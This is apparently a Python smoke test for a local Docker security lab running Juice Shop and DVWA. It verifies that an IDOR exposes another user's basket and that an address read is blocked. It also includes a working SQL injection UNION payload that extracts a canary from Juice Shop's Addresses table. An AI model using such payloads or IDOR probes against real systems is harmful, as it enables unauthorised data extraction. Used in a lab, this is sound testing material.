#!/usr/bin/env python3
"""Smoke test for fresh lab reproduction.

Runs:
1. docker compose down -v
2. docker compose up -d
3. python lab/seed.py --out lab/credentials.json
4. Verifies User A reading User B's basket (/rest/basket/{bid_b}) returns 200 + canary
5. Verifies User A reading User B's address (/api/Addresss/{id_b}) returns 400 (blocked)
6. Verifies SQLi UNION extraction of canary on /rest/products/search
"""
import json
import subprocess
import sys
import time
from pathlib import Path
import requests

ROOT_DIR = Path(__file__).resolve().parent.parent
COMPOSE_FILE = ROOT_DIR / "lab" / "docker-compose.yml"
CREDS_FILE = ROOT_DIR / "lab" / "credentials.json"


def run_cmd(cmd: list[str]) -> subprocess.CompletedProcess:
    print(f"[cmd] {' '.join(cmd)}")
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        print(f"STDERR: {res.stderr}")
    return res


def wait_for_service(url: str, name: str, timeout: int = 45) -> bool:
    print(f"Waiting for {name} at {url}...")
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            r = requests.get(url, timeout=3)
            if r.status_code in (200, 302, 404):
                print(f"{name} is up ({r.status_code}) after {time.time()-t0:.1f}s")
                return True
        except Exception:
            pass
        time.sleep(2)
    print(f"Timeout waiting for {name}")
    return False


def main():
    print("=== Step 1: docker compose down -v ===")
    run_cmd(["docker", "compose", "-f", str(COMPOSE_FILE), "down", "-v"])

    print("\n=== Step 2: docker compose up -d ===")
    res_up = run_cmd(["docker", "compose", "-f", str(COMPOSE_FILE), "up", "-d"])
    if res_up.returncode != 0:
        print("Failed to start containers.")
        sys.exit(1)

    print("\n=== Step 3: Wait for services ===")
    assert wait_for_service("http://localhost:3000", "Juice Shop"), "Juice Shop failed to start"
    assert wait_for_service("http://localhost:4280/setup.php", "DVWA"), "DVWA failed to start"
    assert wait_for_service("http://localhost:9999/_hits", "Canary"), "Canary failed to start"

    print("\n=== Step 4: Run lab/seed.py ===")
    res_seed = run_cmd([sys.executable, str(ROOT_DIR / "lab" / "seed.py"), "--out", str(CREDS_FILE)])
    if res_seed.returncode != 0:
        print("Seeding failed.")
        sys.exit(1)

    assert CREDS_FILE.exists(), f"Credentials file {CREDS_FILE} not found"
    creds = json.loads(CREDS_FILE.read_text())
    canary = creds["canary_value"]
    token_a = creds["user_a"]["token"]
    bid_b = creds["user_b"]["bid"]
    addr_id_b = creds["user_b"]["address_id"]

    print("\n=== Step 5: Verify IDOR Canary in Basket (User A reads User B's basket) ===")
    r_basket = requests.get(
        f"http://localhost:3000/rest/basket/{bid_b}",
        headers={"Authorization": f"Bearer {token_a}"},
        timeout=5,
    )
    print(f"Basket read status: {r_basket.status_code}")
    print(f"Canary present in basket: {canary in r_basket.text}")
    assert r_basket.status_code == 200, f"Expected 200, got {r_basket.status_code}"
    assert canary in r_basket.text, "Canary value not found in User B basket"

    print("\n=== Step 6: Verify IDOR Known-False (User A reads User B's address) ===")
    r_addr = requests.get(
        f"http://localhost:3000/api/Addresss/{addr_id_b}",
        headers={"Authorization": f"Bearer {token_a}"},
        timeout=5,
    )
    print(f"Address read status: {r_addr.status_code}")
    assert r_addr.status_code == 400, f"Expected 400 (blocked), got {r_addr.status_code}"

    print("\n=== Step 7: Verify SQLi UNION extraction on Juice Shop ===")
    payload = "q')) UNION SELECT 1, streetAddress, 'desc', 1, 0, 'img', null, '2020', '2020', null FROM Addresses --"
    r_sqli = requests.get("http://localhost:3000/rest/products/search", params={"q": payload}, timeout=5)
    print(f"SQLi UNION status: {r_sqli.status_code}")
    print(f"Canary present in SQLi response: {canary in r_sqli.text}")
    assert r_sqli.status_code == 200, f"Expected 200, got {r_sqli.status_code}"
    assert canary in r_sqli.text, "Canary value not found in SQLi extraction"

    print("\n=== ALL FRESH REPRODUCTION SMOKE CHECKS PASSED ===")


if __name__ == "__main__":
    main()
